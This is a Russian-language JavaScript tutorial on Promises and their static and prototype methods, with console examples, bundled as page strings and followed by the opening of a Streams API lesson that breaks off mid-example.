посмотрим, что же создает конструктор **~Promise~**:\n\n~~~js\nconst promise = new Promise(() => console.log('Promise starts'))\nconsole.log(promise)\n~~~\n\n~~~console\nPromise starts\n\n▼ Promise {<pending>}\n  ▼ [[Prototype]]: Promise\n    ► catch: ƒ catch()\n    ► constructor: ƒ Promise()\n    ► finally: ƒ finally()\n    ► then: ƒ then()\n      Symbol(Symbol.toStringTag): \"Promise\"\n    ► [[Prototype]]: Object\n    [[PromiseState]]: \"pending\"\n    [[PromiseResult]]: undefined\n~~~\n\nИтак, так мы получили экземпляр, который имеет свойство ~[[PromiseState]]~ (состояние промиса) со значением \"pending\" и свойство ~[[PromiseResult]]~ (результат) со значением ~undefined~.\n^^Эти свойства можно увидеть в консоли дебаггера, однако скрипт не имеет к ним доступа.^^\n\nКроме того, мы видим три \"унаследованных\" метода: **~then~**, **~catch~** и **~finally~**, которые мы разберем далее.\n\n__________________________________________\n\n### ![ico-25 icon] Статические методы\n\nДавайте еще посмотрим, какие статические методы есть у коструктора **~Promise~**.\n\n~~~js\nconsole.dir(Promise)\n~~~\n\n~~~console\n▼ ƒ Promise()\n  ►  all: ƒ all()\n  ►  allSettled: ƒ allSettled()\n  ► any: ƒ any()\n  length: 1\n  name: \"Promise\"\n  ► prototype: Promise {Symbol(Symbol.toStringTag): 'Promise', then: ƒ, catch: ƒ, finally: ƒ}\n  ► race: ƒ race()\n  ► reject: ƒ reject()\n  ► resolve: ƒ resolve()\n  ► withResolvers: ƒ withResolvers()\n  ► Symbol(Symbol.species): ƒ Promise()\n  ► Symbol(Symbol.species): ƒ Promise()\n    arguments: (...)\n    caller: (...)\n  ► [[Prototype]]: ƒ ()\n~~~\n\nПосмотрим, что они умеют.\n\n~~~js\nconst promise = Promise.resolve('Hello')\nconsole.log(promise)\n~~~\n\n~~~console\n▼ Promise {<fulfilled>: 'Hello'}\n  ► [[Prototype]]: Promise\n    [[PromiseState]]: \"fulfilled\"\n    [[PromiseResult]]: \"Hello\"\n~~~\n\nОк, мы получили экземпляр, состояние которого уже не \"~pending~\", а \"**~fulfilled~**\".\nИ результат уже не ~undefined~, а \"**Hello**\".\n\n~~~js\nconst promise = Promise.reject('Access denied.')\nconsole.log(promise)\n~~~\n\n~~~console\n▼ Promise {<rejected>: 'Access denied.'}\n  ► [[Prototype]]: Promise\n    [[PromiseState]]: \"rejected\"\n    [[PromiseResult]]: \"Access denied.\"\n~~~\n\nТеперь мы получили экземпляр, состояние которого уже не \"~pending~\", не \"~fulfilled~\", а \"**~rejected~**\".\nИ результат \"**Access denied.**\".\n\nТ.е. мы полчили некий объект, у которого могут быть различные состояния (~[[PromiseState]]~), и который может иметь содержимое (~[[PromiseResult]]~).\nЭто весьма похоже на закрытую коробку, в которой может быть содержимое (~[[PromiseResult]]~).\n\nИтак, экземпляр конструктора **~Promise~** будет находиться в одном из трех возможных состояний:\n\n| **pending** | **fulfilled** | **rejected** |\n| ^^Содержимого еще нет (коробка пуста)^^ | ^^В коробке - результат^^  | ^^В коробке - сообщение об ошибке^^ |\n\n_________________________________________\n\n![ico-35 coffee]\n\nПредположим, вы пришли в кафе, где нет официантов, и заказали ![ico-35 egg].\n\nПри этом на столе перед вами появилась коробка, в которой в какой-то момент появится ответ на ваш заказ.\nОтвет появится не сразу, поскольку нужно время, чтобы передать заказ на кухню.\nОтвет может быть положительным, тогда в коробке появится ![ico-35 egg],\nили же отрицательным, если в данный момент повар не может приготовить ![ico-35 egg] ввиду отсутствия необходимых ингредиентов.\n\nПрикол в том, что вы не можете заглянуть в коробку и узнать, появилось там что-то, или нет.\n\nПока коробка пуста, ее состояние (~[[PromiseState]]~) будет **~pending~**.\nЕсли в коробке появится ![ico-35 egg], то состяние (~[[PromiseState]]~) станет **~fulfilled~**.\nЕсли в коробке отказ, то состяние (~[[PromiseState]]~) станет **~rejected~**.\n\n| **~PromiseState~** | **~PromiseResult~** |\n| **~pending~**      | ![ico-25 wait]      |\n| **~fulfilled~**    | ![ico-40 egg]       |\n| **~rejected~**     | ![ico-25 error]     |\n\nТеперь надо разобраться с тем, как \"вытащить\" из этого экземпляра значения свойств ~[[PromiseState]]~ и ~[[PromiseResult]]~.\nВ консоли-то мы их видим, но для нашего кода эти свойства недоступны.\n\nА кушать-то хочется.\n\nДавайте испытаем прототипные методы, которые доступны экземпляру конструктора **~Promise~**.\n\n_______________________________________________________\n\n### ![ico-25 icon] Прототипные методы\n\nКаждый экземпляр, созданный конструктором **~Promise~**, \"наследует\" от \"папочки\" методы **~then~**, **~catch~** и **~finally~**.\n\nМетоды **~then~** и **~catch~** - это две \"дырки\" в коробке, через которые мы можем извлечь то, что в ней находится.\nДля этого нужно \"всунуть руки\" в эти дырки.\n\nПод \"руками\" подразумеваются **функции**.\n\n![ico-25 warn] Итак, методы **~then~**, **~catch~** и **~finally~** являются **функциями высшего порядка**, поскольку их аргументами должны быть **функции**.\n\nОднако если вы передадите методу любое другое значение, не являющееся функцией, или вообще не передадите ничего, то исключения не будет, хотя метод не сработает.\nТ.е. выражение:\n\n~~~js\nPromise.resolve('Access granted.').then()\n~~~\n\nили:\n\n~~~js\nPromise.resolve('Access granted.').then(10)\n~~~\n\nбудет равносильно выражению:\n\n~~~js\nPromise.resolve('Access granted.')\n~~~\n\nЭто логично, ведь задача метода - передать колбек в **Event Loop**, а если передавать нечего, то метод **ничего делать не будет**.\n\n![ico-25 warn] Методы **~then~**, **~catch~** и **~finally~** возвращают экземпляр **~Promise~**.\n\nТ.е. как только вы создали экземпляр **~Promise~**, вы уже не сможете \"вырваться\" из \"заколдованного круга\", т.е. что бы вы ни делали, результатом всегда будет новый экземпляр **~Promise~**.\n\n#### ![ico-20 icon] catch\n\nФункция, которую мы передадим методу **~catch~**, заберет сообщение об ошибке, если запрос будет отклонен и состояние нашей \"коробки\" станет **~rejected~**.\n\n~~~js\nconst promise = Promise.reject('Access denied.')\n~~~\n\n~~~error\n    Uncaught (in promise) Access denied.\n~~~\n\nДавайте отнесемся серьезно к обработке исключений.\nОчень плохо, если в процессе работы вашего приложения консоль будет красной от сообщений об ошибке.\n\n☼☼☼ Не заставляйте консоль краснеть за вас ☼☼☼\n\n~~~js\nconst promise = Promise.reject('Access denied.').catch(console.log)\n~~~\n\n~~~console\n    ► Uncaught (in promise) Access denied.\n~~~\n\n#### ![ico-20 icon] then\n\nЧерез дырку **~then~** можно всунуть сразу две руки: одну - за результатом, вторую - за сообщением об ошибке:\n\n~~~js\nconsole.log('Start')\nPromise.resolve('Access granted.').then(console.log, console.log)\nPromise.reject('Access denied.').then(console.log, console.log)\nconsole.log('Finish')\n~~~\n\n~~~console\nStart\nFinish\nAccess granted.\nAccess denied.\n~~~\n\n#### ![ico-20 icon] finally\n\nДумаю, с этим методом все достаточно просто.\n\n~~~js\nconsole.log('Start')\nPromise.resolve('Access granted.')\n  .then(console.log, console.log)\n  .finally(() => console.log('Finally'))\nPromise.reject('Access denied.').then(console.log, console.log)\nconsole.log('Finish')\n~~~\n\n~~~console\nStart\nFinish\nAccess granted.\nAccess denied.\nFinally\n~~~\n______________________________________________\n\n## ![ico-30 icon] Магическая коробка\n\nИтак, с помощью конструктора **~Promise~** можно создать магическую коробку с двумя дырками.\nКак мы уже поняли, заглянуть в эту коробку \"здесь и сейчас\" просто нереально.\nДоступ к ее содержимому возможен только через [►►►**Event Loop**►►►](page/Event-Loop).\nТ.е. вам придется отправить за результатом колбеки, и другого способа извлечь содержимое из коробки не существует.\n\nДавайте разберемся, почему именно так.\n\nНа самом деле экземпляр **~Promise~** работает как \"ловушка\" для результата асинхронного процесса.\nПоскольку мы не знаем, когда завершится асинхронный процесс, то мы не знаем, когда состояние коробки изменится и в ней появится содержимое.\n\nЕсли бы коробку можно было сразу же открыть, то, скорее всего, мы увидели бы пустую коробку.\nПредставьте теперь, что вы зависаете возле коробки и ждете, когда в ней появится содержимое.\nТ.е. блокируете стек вызовов.\nНо содержимое не может появиться в коробке, пока стек вызовов занят.\nДаже если уже пришел ответ сервера, или истекло время таймера...\nТ.е. вы зависнете с пустой коробкой в руках. При этом заблокируете страницу.\nВывод: код, создавший экземпляр **~Promise~**, должен завершить работу и освободить стек вызовов.\n\nКогда мы передаем экземпляру **~Promise~** свои колбеки через \"дырки\" **~then~**, **~catch~** и **~finally~**, мы освобождаем стек вызовов и даем возможность коробке получить нужный результат. Получив результат, коробка передаст его одному из наших колбеков.\n\nТеперь вернемся к конструктору.\nМы знаем, что при вызове конструктора **~Promise~** мы должны передать ему некую функцию (точнее, ссылку на функцию).\n\n~~~js\nconst promise = new Promise(function (resolve, reject) {\n  ...\n})\n~~~\n\nЭта функция будет сразу же вызвана.\nНо у этой функции есть два формальный параметра.\n\nТут у вас должен возникнуть вполне логичный вопрос:\nесли мы передаем конструктору **~Promise~** ссылку на функцию, но не передаем аргументы для вызова этой функции, то как конструктор может ее вызвать?\nВедь при вызове он должен передать ей аргументы?\n\n◘◘![ico-25 coffee] ** 2**◘◘\n~~~js\nconst promise = (function (startTime) {\n  const interval = Math.round(Math.random() * 5000)\n\n  function recurse (callback) {\n    Date.now() - startTime < interval\n      ? requestAnimationFrame(recurse.bind(null, callback))\n      : callback(Date.now() - startTime)\n  }\n\n  return new Promise(resolve => recurse(resolve))\n})(Date.now())\n\npromise.then(console.log)\n~~~\n\nВ этом примере мы видим, что колбек **~console.log~** мы передаем уже после того, как экземпляр **~Promise~** был создан.\nДа и не могли бы раньше, поскольку мы используем его метод **~then~** для передачи колбека.\n\nИменно в этом и заключается магия нашей коробки с двумя дырками.\nКоробка сама отправит собственные колбеки за результатом в [►►►**Event Loop**►►►](page/Event-Loop).\n\nДавайте помотрим, что произойдет, если мы создадим экземпляр ~Promise~ значительно раньше, чем повесим колбэки с помощью методов **_~then~_** и **_~catch~_**\n\n~~~js\nvar test = new Promise(resolve => resolve(`Time: ${new Date().getSeconds()}/`))\n~~~\n\nВыждав несколько секунд, выполним код:\n\n~~~js\ntest.then(data => console.log(data, new Date().getSeconds()))\n~~~\n\nВ консоли мы увидим что-то вроде:\n\n~~~console\nStart\nEnd\nTime: 24/ 36\n~~~\n\nТ.е. в момент создания промиса **~test~** было 24 секунды, а когда мы добавили колбэки, было уже 36 секунд.\nНо прикол в том, что, хотя мы \"всунули руки\" в дырку **~then~** на несколько секунд позже, магическая коробка сохранила для нас результат, который был получен ранее.\n\nПредставьте, что вы запустили несколько асинхронных процессов, получили несколько \"магических коробок\", и поставили их на полку.\nВы сможете извлечь содержимое коробок в любой удобный вам момент и в любой удобной для вас последовательности.\n\nДля иллюстрации этого воспользуемся анонимной функцией из предыдущего примера, но теперь дадим ей имя **~createPromise~** и немного модифицируем ее:\n\n~~~js\nfunction createPromise (startTime, title) {\n  const interval = Math.round(Math.random() * 5000)\n  function recurse (callback) {\n    const time = Date.now() - startTime\n    time < interval\n      ? requestAnimationFrame(recurse.bind(null, callback))\n      : callback(`${title}: ${Date.now() - startTime}`)\n  }\n  return new Promise(resolve => recurse(resolve))\n}\n~~~\n\nТеперь создадим с ее помощью три экземпляра **~Promise~**:\n\n◘◘![ico-25 cap] ** 3**◘◘\n~~~js\nconst first = createPromise(Date.now(), 'first')\nconst second = createPromise(Date.now(), 'second')\nconst third = createPromise(Date.now(), 'third')\n\nfirst.then(console.log)\nsecond.then(console.log)\nthird.then(console.log)\n~~~\n\nКак мы видим, резолвятся эти три экземпляра в произвольном порядке, в зависимости от значения случайной величины **~interval~**, которая определяется в момент создания экземпляра.\n\n{{{promise-03.js}}}\n\nПредположим, нам нужно строго соблюдать последовательность вывода: first → second → third.\nВоспользуемся для этого \"магическими\" свойствами нашей \"коробки с двумя дырками\":\n\n◘◘![ico-25 cap] ** 4**◘◘\n~~~js\nconst first = createPromise(Date.now(), 'first').then(console.log)\nconst second = createPromise(Date.now(), 'second')\nconst third = () => createPromise(Date.now(), 'third').then(console.log)\n\nfirst.then(() => second.then(console.log).then(third))\n~~~\n\n{{{promise-04.js}}}\n\n__________________________________________________________________________________________\n\n## ![ico-25 icon] \"Пакеты\" промисов\n\nПродолжая изучать статические методы конструктора **~Promise~**, мы обнаруживаем, что кроме **~Promise.resolve~** и **~Promise.reject~**, есть еще ряд полезных методов, с помощью которых мы можем обслуживать сразу целые коллекции промисов.\nГлавное - чтобы эти коллекции были **итерабельными**.\n\nКогда мы запускаем параллельно несколько асинхронных операций, мы попадаем в стихию возвращающихся к нам колбеков.\n\n@@@@\nПредставьте себе теннисный корт, и пушка выстреливает шарики со скоростью пять шариков в секунду, а вам нужно их отбивать.<br>А если две пушки? Три пушки?...\n![](illustrations/promise-all.jpg)\n@@@@\n\nБезусловно, промисы облегчают задачу.\nЭти \"магические коробки\" работают как \"ловушки\" для шариков.\nМы можем \"извлекать шарики\" из этих \"коробок\" с помощью метода **~then~**.\n\nВсе осложняется, если результаты этих асинхронных операций вам нужны в заданном порядке.\n\n~~~js\nconst data = ['first', 'second', 'third', 'fourth', 'fifth', 'sixth', 'seventh', 'eighth', 'ninth']\nconst random = num => Math.round(Math.random() * num)\n\nconst promises = data\n  .map(item => new Promise(resolve => setTimeout(() => resolve(item), random(5000))))\npromises.forEach(promise => promise.then(console.log))\n~~~\n\n{{{promise-arrays-01.js}}}\n\nТут явно напрашивается некое решение такого рода:\n\n~~~js\nconst data = ['first', 'second', 'third', 'fourth', 'fifth', 'sixth', 'seventh', 'eighth', 'ninth']\nconst random = num => Math.round(Math.random() * num)\n\nconst promises = data\n  .map(item => new Promise(resolve => setTimeout(() => resolve(item), random(5000))))\n\nconst results = []\nconst start = Date.now()\npromises\n  .forEach((promise, index) => promise.then(value => { results[index] = { time: Date.now() - start, value } }))\n~~~\n\n{{{promise-arrays-02.js}}}\n\nЭто особенно удобно, если результаты нескольких асинхронных операций нам нужны одновременно.\nМы можем запустить несколько асинхронных операций, и обрабатывать полученные данные \"пакетом\", когда они все завершатся.\n\nОднако в этом варианте мы не знаем, когда массив **~results~** будет готов.\nТ.е. нужен еще один промис, который вернет нам **~results~** после того, как все промисы в массиве разрезолвятся.\n\n◘◘![ico-25 cap] ** 5**◘◘\n\n~~~js\nconst data = ['first', 'second', 'third', 'fourth', 'fifth', 'sixth', 'seventh', 'eighth', 'ninth']\nconst random = num => Math.round(Math.random() * num)\n\nconst promises = data\n  .map(value => new Promise(resolve => setTimeout(() => resolve({ time: Date.now() - start, value }), random(5000))))\n\nconst results = new Array(promises.length).fill(null)\nconst start = Date.now()\npromises\n  .forEach((promise, index) => promise.then(response => { results[index] = response }))\n\nfunction recurse (resolve) {\n  results.filter(item => !item).length\n    ? setTimeout(recurse.bind(null, resolve), 400)\n    : resolve(results)\n}\n\nconst promise = new Promise(resolve => recurse(resolve))\n\npromise.then(console.log)\n~~~\n\nИтак, далее мы будем рассматривать статические методы конструктора **~Promise~**, которые принимают в качестве аргумента ссылку на **массив промисов** и возвращают один промис.\n\n@@@@\nТ.е \"упакуем\" несколько \"магических коробок\" в одну \"магическую коробку\".\n![](illustrations/promises-collection.png)\n@@@@\n\n__________________________________________\n\n### ![ico-20 icon] Promise.all\n\nЭтот метод принимает итерабельную коллекцию промисов, и возвращает один промис, который резолвится массивом результатов тогда, когда все промисы разрезолвятся.\nЗамечательно то, что порадок следования ответов в массиве результатов строго соотвествует порядку следования промисов в исходном массиве промисов.\n\n◘◘![ico-25 cap] ** 6**◘◘\n\n~~~js\nconst create = (message, time) => new Promise(resolve => setTimeout(() => resolve(message), time))\nconst show = message => document.body.appendChild(document.createElement('p')).innerText = message\n\nconst promises = [\n  create('Hello', 1000),\n  create('Bye', 3000),\n  create('How are you?', 2000)\n]\n\nPromise.all(promises)\n  .then(responses => responses.forEach(show))\n~~~\n\n![ico-20 warn] Если существует вероятность \"провала\" хотя бы одного из промисов, то весь наш \"пакет\" слетит:\n\n~~~js\nconst executor = (resolve, reject) => Math.random() > 0.5 ? resolve('success') : reject(new Error('ups...'))\n\nconst promises = new Array(10).fill(new Promise(executor))\n\nPromise.all(promises)\n  .then(console.log, console.warn)\n~~~\n\n{{{promise-all-01.js}}}\n\nДавайте вернемся к нашему примеру 5 и посмотрим, насколько проще станет код с использованием метода **~Promise.all~**:\n\n◘◘![ico-25 cap] ** 7**◘◘\n\n~~~js\nconst data = ['first', 'second', 'third', 'fourth', 'fifth', 'sixth', 'seventh', 'eighth', 'ninth']\nconst random = num => Math.round(Math.random() * num)\nlet results = null\n\nconst start = Date.now()\n\nconst promises = data\n  .map(value => new Promise(resolve => setTimeout(() => resolve({ time: Date.now() - start, value }), random(5000))))\n\nPromise.all(promises)\n  .then(responses => { results = responses })\n  .then(() => console.log(results))\n~~~\n\n______________________________________________\n\n### ![ico-20 icon] Promise.allSettled\n\nВозвращает промис, который резолвится массивом объектов.\nКаждому промису в исходном массиве соответствует объект в результирующем массиве.\nОбъект имеет три возможных свойства: **~status~**, **~value~** и **~reason~**.\n\nСвойство **~status~** может принимать одно из двух значений: **~fulfilled~** или **~rejected~**.\nКогда свойство **~status~** имеет значение **~fulfilled~**, то свойство **~value~** содержит результат промиса.\nКогда свойство **~status~** имеет значение **~rejected~**, то свойство **~reason~** содержит сообщение о причине ошибки.\n\n~~~js\nconst promises = ['map', 'google', 'research', 'store'].map(item => Promise.resolve(item))\npromises.push(new Promise((resolve, reject) => setTimeout(reject, 100, 'Access denied.')))\n\nPromise.allSettled(promises)\n  .then(results => results.forEach(console.log))\n~~~\n\n{{{promise-all-settled-01.js}}}\n\n______________________________________________\n\n### ![ico-20 icon] Promise.any\n\nЭтот статический метод конструктора **~Promise~** находит первый благополучно разрешившийся промис в \"пакете\" промисов и возвращает его.\n\n~~~js\nconst freePort = 4000\n\nconst promises = [3000, 3256, 4000, 3040, 5000]\n  .map(port => new Promise((resolve, reject) => port === freePort ? resolve(port) : reject(port)))\n\nPromise.any(promises).then(console.log)\n~~~\n\nЭтот метод хорош тогда, когда мы посылаем несколько запросов, но удовлетворимся одним из результатов.\nНапример, если мы хотим вывести картинку на страницу, но не помним точно, в какой папке она находится.\n\n◘◘![ico-25 cap] ** 8**◘◘\n\n~~~js\nconst getURLs = fileName => ['icons', 'images', 'files', 'sounds']\n  .map(folder => `https://garevna.github.io/js-lessons/${folder}/${fileName}`)\n\nfunction testURL (src) {\n  return new Promise ((resolve, reject) => {\n    const img = Object.assign(new Image(48), {\n      onload (event) {\n        resolve(img)\n      },\n      onerror (event) {\n        reject(`Image ${src} does not exist.`)\n      },\n      src\n    })\n  })\n}\n\nconst promises = getURLs('coffee.png').map(url => testURL(url))\n~~~\n\nЕсли мы воспользуемся предыдущим методом:\n\n~~~js\nPromise.allSettled(promises).then(console.log)\n~~~\n\nто увидим в консоли:\n\n~~~console\n▼ (4) [{…}, {…}, {…}, {…}]\n  ► 0: {status: 'fulfilled', value: img}\n  ► 1: {status: 'rejected', reason: 'Image https://garevna.github.io/js-lessons/images/coffee.png does not exist.'}\n  ► 2: {status: 'rejected', reason: 'Image https://garevna.github.io/js-lessons/files/coffee.png does not exist.'}\n  ► 3: {status: 'rejected', reason: 'Image https://garevna.github.io/js-lessons/sounds/coffee.png does not exist.'}\n    length: 4\n  ► [[Prototype]]: Array(0)\n~~~\n\nОднако, если мы уверены, что хотя бы один из промисов разрешится, то можно применить метод **~Promise.any~**:\n\n~~~js\nPromise.any(promises)\n  .then(img => document.body.appendChild(img))\n~~~\n\nи тогда мы увидим на странице нужную картинку.\n______________________________________________\n\n### ![ico-20 icon] Promise.race\n\n\"Скачки\" - какой из промисов разрешится первым.\nНе важно, каким будет результат.\nГлавное - он пришел к финишу первым.\n\nТ.е. если первым \"провалится\" один из промисов, то мы увидим сообщение об ошибке.\n\nВоспользуемся **Github Users API**:\n\n◘◘![ico-25 cap] ** 9**◘◘\n\n~~~js\nconst addElem = tagName => document.body\n  .appendChild(document.createElement(tagName))\n\nconst getURLs = () => ['brynary', 'stocad', 'holin', 'mojombo', 'Bill']\n  .map(id => `https://api.github.com/users/${id}`)\n\nconst show = response => {\n  const text = addElem('h4')\n  if (response.avatar_url) {\n    Object.assign(addElem('img'), {\n      src: response.avatar_url,\n      width: 150\n    })\n    text.innerText = `${response.id}: ${response.login}`\n  } else {\n    text.innerText = response.message.replaceAll('. ', '.\\n')\n    text.style.color = '#a00'\n  }\n}\n\nfunction getPromise (url) {\n  return new Promise ((resolve, reject) => {\n    fetch(url)\n      .then(response => response.json())\n      .then(resolve)\n  })\n}\n\nconst promises = getURLs().map(url => getPromise(url))\n\nPromise.race(promises).then(show)\n~~~\n\n{{{promise-race.js}}}\n__________________________________________________________________________________________\n\n## ![ico-25 icon] Примеры\n\nИспользуем **Battery API**  для получения инфо о зарядке аккумулятора.\n![ico-25 warn] Этот пример не будет работать в консоли страницы ~about:blank~.\n^^Метод  **_getBattery()_**  объекта  **navigator** возвращает промис.^^\n\n\n◘◘![ico-25 cap] **10**◘◘\n\n~~~js\nnavigator.getBattery()\n  .then(result => {\n    for (const prop in result) {\n      console.log(`${prop}: ${result[prop]}`)\n    }\n})\n~~~\n\n__________________________________________________________________________________________\n\n◘◘![ico-25 cap] **11**◘◘\n\n~~~js\nconst boy = [\n  'Hi, what\\'s your name?',\n  'And I\\'m Robert. Where do you live?',\n  'In Lviv. Do you work or study?',\n  'Me too. Okay, see you later, good luck!'\n]\n\nconst girl = [\n  'Hi, I\\'m Helen, and you?',\n  'In Kharkov. And where are you?',\n  'I study and work. And you?',\n  'Thanks, mutually!'\n]\n\nfunction output () {\n  console.log(this.shift())\n  return this[0]\n}\n\nboySpeak = output.bind(boy)\ngirlSpeak = output.bind(girl)\n\nnew Promise(resolve => resolve())\n  .then(boySpeak)\n  .then(boySpeak)\n  .then(boySpeak)\n  .then(boySpeak)\n\nnew Promise(resolve => resolve())\n  .then(girlSpeak)\n  .then(girlSpeak)\n  .then(girlSpeak)\n  .then(girlSpeak)\n~~~\n\n______________________________________________________________\n\nДавайте немного расширим прототип конструктора **~Error~**:\n\n~~~~js\nObject.defineProperty(Error.prototype, 'name', {\n  get () { return this.errorNames[this.code] }\n})\n\nObject.defineProperty(Error.prototype, 'message', {\n  get () { return this.messages[this.code] }\n})\n\nObject.assign(Error.prototype, {\n  errorNames: [\n    'CustomError',\n    'RandomError',\n    'FatalError',\n    'GameOver',\n    'Shit',\n    'FuckingError',\n    'StrangeError',\n    'XSS',\n    'DoS',\n    'DDoS'\n  ],\n  messages: [\n    'Not authorized.',\n    'Something happens...',\n    'Access denied.',\n    'Try another way.',\n    'You are the kremlin troll.',\n    'Operation failed.',\n    'Unknown operation.',\n    'Malicious code injection.',\n    'Denial-of-service attack.',\n    'Distributed denial-of-service attack.'\n  ]\n})\n~~~~\n\nКроме того, раширим функциональность консоли:\n\n~~~~js\nObject.assign(console, {\n  warning (error) {\n    console.warn(`(${error.code}) ${error.name}: ${error.message}`)\n  }\n})\n~~~~\n\nТеперь сделаем следующее:\n\n◘◘![ico-25 cap] **12**◘◘\n\n~~~js\nconst func = callback => callback(Object.assign(new Error(), { code: Math.round(Math.random() * 9) }))\n\nconst getError = (resolve, reject) => setTimeout(func.bind(null, reject), Math.random() * 10000)\n\nfor (let num = 0; num < 10; num++) {\n  new Promise(getError)\n    .then(null, console.warning)\n}\n~~~\n\n{{{promise-12.js}}}\n\n________________________________\n\n| [![ico-25 plunker] **13**](https://plnkr.co/edit/99ajm1Z3jcpKQQoE ) | [![ico-25 plunker] **14**](https://plnkr.co/edit/DIStxeDAPpXmhSTw ) | [![ico-70 replit] **15**](https://repl.it/@garevna/promise-sample-1 ) |\n\n__________________________________________________________________________________________\n\n[![ico-30 hw] **Quiz**](quiz/promise)\n"},74158:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] Streams API\n\nобеспечивает фрагментированный доступ из JS к данным, представляющим собой потенциально неограниченный поток байт\n\n^^Считывание больших объемов данных одним \"куском\" ( или чанком ) приводит к чрезмерному расходу памяти памяти как на стороне клиента, так и на стороне сервера^^\n^^Если же объем считываемой информации в принципе не ограничен, то есть речь не идет о пересылке конкретного файла клиенту, а происходит процесс непрерывной подзагрузки данных, то для организации такого процесса необходимо дробить поток данных на отдельные куски ( chunks ) и управлять очередностью их получения ( на стороне клиента ) и передачи ( на стороне сервера )^^\n^^Для организации работы кода с потоками данных используется Streams API^^\n^^Streams API предоставляет коду ряд интерфейсов ( сервисов ), с помощью которых можно создавать потоки и управлять процессом потоковой передачи данных^^\n\n[![ico-20 link] MDN](https://developer.mozilla.org/ru/docs/Web/API/Streams_API)\n\n____________________________________________________\n\n## ![ico-25 icon] Интерфейсы Streams API\n\nК основным интерфейсам **Streams API** относятся\n\n^^^[Readable Streams]\n![ico-20 green-ok] ReadableStream\n![ico-20 green-ok] ReadableStreamDefaultReader\n![ico-20 green-ok] ReadableStreamDefaultController\n^^^\n^^^[Writable streams]\n![ico-20 green-ok] WritableStream\n![ico-20 green-ok] WritableStreamDefaultWriter\n![ico-20 green-ok] WritableStreamDefaultController\n^^^\n\n### ![ico-20 icon] ReadableStream\n\n**Конструктор**\n\nСоздает экземпляры класса **ReadableStream**\n\nПолучает в качестве аргументов функции, которые задают функциональность потока:\n\n^^• cancel()^^\n^^• getReader()^^\n^^• pipeThrough()^^\n^^• pipeTo()^^\n^^• tee()^^\n\n**Конструктор ~ReadableStream~**\n\n~~~~ReadableStream\n▼ ƒ ReadableStream\n    arguments: (...)\n    caller: (...)\n    length: 0\n    name: \"ReadableStream\"\n  ▼ prototype:\n      ► cancel: ƒ cancel()\n      ► constructor: ƒ ReadableStream()\n      ► getReader: ƒ getReader()\n        locked: (...)\n      ► pipeThrough: ƒ pipeThrough()\n      ► pipeTo: ƒ pipeTo()\n      ► tee: ƒ tee()\n      ► get locked: ƒ locked()\n      ► __proto__: Object\n  ► __proto__: ƒ ()\n~~~~\n\nКонструктор принимает в качестве аргумента объект\n\n~~~js\nconst textStream = new ReadableStream({\n    ...\n})\n~~~\n\nСвойства этого объекта определяют модель потока\n\nПервое свойство - **~start()~** - это метод, который вызывается единожды при создании потока и определяет его функциональность\n\nМетод ~start()~ имеет обязательный формальный параметр - объект **контроллера**\n\n![ico-25 cap] ** 1**\n\n^^Посмотрим в консоли на объект **контроллера**^^\n\n~~~js\nconst textStream = new ReadableStream({\n  start (controller) {\n    console.dir(controller)\n  }\n})\n~~~\n\n^^**Контроллер** имеет встроенные методы для управления состоянием потока и очередью ( ~queue~ ) внутри него^^\n\n~~~~ReadableStreamDefaultController\n▼ ReadableStreamDefaultController\n    desiredSize: (...)\n  ▼ __proto__:\n      ► close: ƒ close()\n      ► constructor: ƒ ReadableStreamDefaultController()\n        desiredSize: (...)\n      ► enqueue: ƒ enqueue()\n      ► error: ƒ error()\n      ► get desiredSize: ƒ desiredSize()\n      ► __proto__: Object\n~~~~\n\n^^Метод **~enqueue()~** помещает переданный ему аргументом фрагмент данных ( ~chunk~ ) в управляемый контроллером поток^^\n\n________________________________________\n\n![ico-25 cap] ** 2**\n\n^^С помощью конструктора **~ReadableStream~** создадим экземпляр **_~textStream~_**^^\n^^Передадим конструктору объект с методом ~start()~^^\n^^В методе ~start()~ объявим массив сообщений, которые и будут чанками потока^^\n^^Далее запустим цикл, который поочередно будет помещать сообщения в контролиремый поток с помощью метода **~enqueue()~** контроллера потока^^\n^^По завершении передачи данных вызовем метод ~close()~ контроллера потока^^\n\n~~~~js\nconst textStream = new ReadableStream({\n  start (controller) {\n    const messages = [\n      'How do you use the Streams API’s readable stream functionality?',\n      'The Fetch API allows you to fetch resources across the network',\n      'The body property is a simple getter exposing the body contents as a readable stream',\n      'You can consume Fetch Body objects as streams and create your own custom readable streams',\n      'The ReadableStream interface of the Streams API represents a readable stream of byte data'\n    ]\n    while (messages.length) {\n      controller.enqueue(messages.shift())\n    }\n    controller.close()\n  }\n})\n~~~~\n\n^^Выведем в консоль созданный нами объект **~textStream~**^^\n\n~~~~textStream\n▼ ReadableStream {locked: false}\n    locked: false\n  ▼ __proto__: ReadableStream\n      ► cancel: ƒ cancel()\n      ► constructor: ƒ ReadableStream()\n      ► getReader: ƒ getReader()\n        locked: (...)\n      ► pipeThrough: ƒ pipeThrough()\n      ► pipeTo: ƒ pipeTo()\n      ► tee: ƒ tee()\n        Symbol(Symbol.toStringTag): \"ReadableStream\"\n      ► get locked: ƒ locked()\n      ► __proto__: Object\n~~~~\n\n^^Обратите внимание, что этого объекта есть унаследованный метод **~getReader~**^^\n^^Он нам понадобится для организации чтения данных из потока^^\n^^Метод **~getReader~** возвращает объект^^\n^^Посмотрим на этот объект в консоли:^^\n\n~~~js\nconst reader = textStream.getReader()\n\nconsole.log(reader)\n~~~\n\n^^В консоли мы видим, что:^^\n^^• объект **~reader~** является экземпляром класса **ReadableStreamDefaultReader**^^\n^^• у него есть унаследованный метод **~read()~**:^^\n\n~~~~ReadableStreamDefaultReader\n▼ ReadableStreamDefaultReader {}\n    closed: (...)\n  ▼ __proto__:\n      ► cancel: ƒ cancel()\n        closed: (...)\n      ► constructor: ƒ ReadableStreamDefaultReader()\n      ► read: ƒ read()\n      ► releaseLock: ƒ releaseLock()\n      ► get closed: ƒ closed()\n      ► __proto__: Object\n~~~~\n\n^^Посмотрим, что возвращает метод **_~read()~_** объекта **~reader~**^^\n\n~~~js\nconsole.log(reader.read())  // ► Promise {<resolved>: {…}}\n~~~\n\n^^Итак, мы знаем все, что нам нужно: метод **_~read()~_** объекта **~reader~** возвращает промис^^\n^^Теперь можно организовать чтение потока **~textStream~**^^\n\n^^Создадим контейнер **~messageBox~** для вывода текста получаемых сообщений на страницу и добавим ему метод **_~putChank~_**, который получает очередной фрагмент потока и помещает его в контейнер:^^\n\n~~~~js\nconst messageBox = document.body\n  .appendChild(document.createElement('section'))\n\nmessageBox.putChank = function 